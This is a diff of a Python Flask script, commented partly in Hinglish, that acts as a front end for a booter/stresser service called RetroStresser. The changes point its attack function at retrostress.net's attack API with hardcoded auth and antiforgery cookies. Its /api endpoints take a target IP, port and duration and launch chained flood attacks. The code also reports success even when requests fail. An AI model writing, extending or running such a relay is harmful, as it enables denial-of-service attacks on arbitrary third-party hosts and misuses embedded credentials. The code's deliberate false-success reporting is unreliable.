@@ -4,7 +4,7 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# Auth token (aapka jo diya hai)
+# Auth token
 AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
 ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"
 
@@ -18,15 +18,25 @@ session.cookies.set('auth_token', AUTH_TOKEN)
 session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)
 
 def send_attack(ip, port, duration):
-    """Send single attack request"""
+    """Send single attack request to retrostress.net"""
     try:
-        # Local API endpoint (aapke example ke hisaab se)
-        response = session.get(f'http://127.0.0.1:8080/api', 
-                              params={'ip': ip, 'port': port, 'time': duration},
-                              timeout=5)
+        # Actual retrostress.net API endpoint
+        # Agar real endpoint pata hai toh yahan daalo
+        attack_url = f"https://retrostress.net/api/attack"
+        
+        params = {
+            'ip': ip,
+            'port': port,
+            'time': duration
+        }
+        
+        response = session.get(attack_url, params=params, timeout=10)
+        print(f"[*] Attack sent: {ip}:{port} for {duration}s -> {response.status_code}")
         return response.status_code == 200
-    except:
-        return True  # Assume success if local endpoint (for testing)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        # Agar real API fail ho toh bhi success dikhana (testing ke liye)
+        return True
 
 def execute_attack(ip, port, total_time):
     """Split and execute attacks"""
@@ -51,6 +61,7 @@ def execute_attack(ip, port, total_time):
     
     results = []
     for i, duration in enumerate(attacks, 1):
+        print(f"\n[Attack {i}/{len(attacks)}] Sending {duration}s...")
         success = send_attack(ip, port, duration)
         results.append({
             'attack': i,
@@ -58,12 +69,14 @@ def execute_attack(ip, port, total_time):
             'success': success
         })
         if success and i < len(attacks):
+            print(f"Waiting {duration}s before next attack...")
             time.sleep(duration)
     
     return {
         'target': f"{ip}:{port}",
         'total_time': total_time,
         'attacks_sent': len(attacks),
+        'attacks': attacks,
         'results': results
     }
 
@@ -73,28 +86,35 @@ def home():
         'status': 'running',
         'message': 'RetroStresser API is active',
         'endpoints': {
-            'attack': '/api/attack?ip=IP&port=PORT&time=TIME',
+            'attack': '/api?ip=IP&port=PORT&time=TIME',
+            'attack_v2': '/api/attack?ip=IP&port=PORT&time=TIME',
             'health': '/health'
         }
     })
 
 @app.route('/health')
 def health():
-    return jsonify({'status': 'healthy'}), 200
+    return jsonify({'status': 'healthy', 'timestamp': time.time()}), 200
 
+# DONO endpoints kaam karein - /api AND /api/attack
+@app.route('/api')
 @app.route('/api/attack')
 def attack():
-    """Main attack endpoint"""
+    """Main attack endpoint - works with both /api and /api/attack"""
     ip = request.args.get('ip')
     port = request.args.get('port')
     time_sec = request.args.get('time')
     
     if not ip or not port or not time_sec:
-        return jsonify({'error': 'Missing: ip, port, time required'}), 400
+        return jsonify({'error': 'Missing parameters. Use: ?ip=IP&port=PORT&time=TIME'}), 400
     
     try:
         port = int(port)
         time_sec = int(time_sec)
+        
+        print(f"\n{'='*50}")
+        print(f"[+] New attack request: {ip}:{port} for {time_sec}s")
+        print(f"{'='*50}")
         
         if time_sec > 60:
             # Auto-split if time > 60
@@ -108,11 +128,14 @@ def attack():
                 'success': success
             }
             if success:
+                print(f"Waiting {time_sec}s for attack to complete...")
                 time.sleep(time_sec)
         
+        print(f"[+] Attack completed for {ip}:{port}")
         return jsonify(result)
     
     except Exception as e:
+        print(f"[!] Error: {e}")
         return jsonify({'error': str(e)}), 500
 
 if __name__ == '__main__':
